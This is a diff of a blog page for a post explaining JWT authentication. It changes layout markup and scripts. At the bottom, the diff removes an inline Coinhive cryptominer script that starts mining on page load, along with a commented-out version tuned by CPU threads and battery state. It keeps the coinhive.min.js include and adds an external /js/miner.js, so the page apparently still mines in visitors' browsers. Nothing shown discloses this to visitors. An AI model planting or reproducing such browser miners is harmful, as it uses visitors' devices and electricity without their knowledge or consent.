@@ -13,7 +13,7 @@
 
 " />
 	<meta name="keywords" content="authentication, jwt" />  
-	<meta http-equiv="last-modified" content="2017-09-21 19:05:19 +0200" /> 
+	<meta http-equiv="last-modified" content="2017-10-06 15:29:24 +0200" /> 
 	<!--<noscript>-->
 	<link rel="stylesheet" href="/css/skel.css" />
 	<link rel="stylesheet" href="/css/style.css" />
@@ -100,6 +100,8 @@
 			<p>In this post I’m going to talk about an authentication “protocol” called JWT, that allows to secure an API so that only authenticated users can use some requests of your API. And more importantly, a user cannot impersonate another by changing something in the request, so we can be reasonably certain that a user is who claims to be.</p>
 
 <p>However, to understand JWT, we must step back and talk about hashing functions.</p>
+
+<!--more-->
 
 <h2 id="hashing-a-one-way-transformation-function">Hashing: a one-way transformation function</h2>
 
@@ -362,7 +364,7 @@ s.setAttribute('data-timestamp', +new Date());
 			<div class="row">
 				
 
-				<article class="6u 12u(small) excerpt">
+				<div class="6u 12u(small) excerpt" id="previousArticle">
 					<header>
 						<h2><a href="/2017/09/19/come-capire-il-bitcoin-le-funzioni-crittografiche.html">Come capire il bitcoin: le funzioni crittografiche</a></h2>
 					</header>
@@ -371,15 +373,15 @@ s.setAttribute('data-timestamp', +new Date());
 
 
 					</section>
-					<footer>
+					<div>
 						<ul class="actions">
 							<li><a href="/2017/09/19/come-capire-il-bitcoin-le-funzioni-crittografiche.html" class="button">Read More</a></li>
 						</ul>
-					</footer>
-				</article>
+					</div>
+				</div>
 				 
 
-				<article class="6u$ 12u(small) excerpt f-right">
+				<div class="6u$ 12u(small) excerpt f-right" id="nextArticle">
 					<header>
 						<h2><a href="/2017/10/03/viviamo-tutti-in-una-grande-simulazione-aliena-sembra-di-no.html">Viviamo tutti in una grande simulazione aliena? Sembra di no</a></h2>
 					</header>
@@ -388,12 +390,12 @@ s.setAttribute('data-timestamp', +new Date());
 
 
 					</section>
-					<footer>
+					<div>
 						<ul class="actions">
 							<li><a href="//2017/10/03/viviamo-tutti-in-una-grande-simulazione-aliena-sembra-di-no.html" class="button">Read More</a></li>
 						</ul>
-					</footer>
-				</article>
+					</div>
+				</div>
 				
 			</div>
 		</footer>
@@ -449,37 +451,9 @@ s.setAttribute('data-timestamp', +new Date());
 	<script src="/js/skel.min.js"></script>
 	<script src="/js/init.js"></script>
 	<script src="/js/prism.js"></script>
+	<script src="/js/infinite-scroll.js"></script>
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-
-var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY');
-
-miner.start();
-
-/*
-try {
-    var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY', {
-        throttle: 0.85,
-        threads: 1
-    });
-
-    var threads = Math.max(1, Math.floor(navigator.hardwareConcurrency / 4));
-    miner.setNumThreads(threads);
-    
-    miner.start();
-    
-    navigator.getBattery().then(function (battery) {
-        if (battery.charging) miner.start();
-        battery.onchargingchange = function (evt) {
-            if (battery.charging) miner.start();
-            else miner.stop();
-        }
-    });
-    } catch (e) {
-        miner.start();
-    }
-    */
-</script>
+<script src="/js/miner.js"></script>
 </body>
 
 </html>
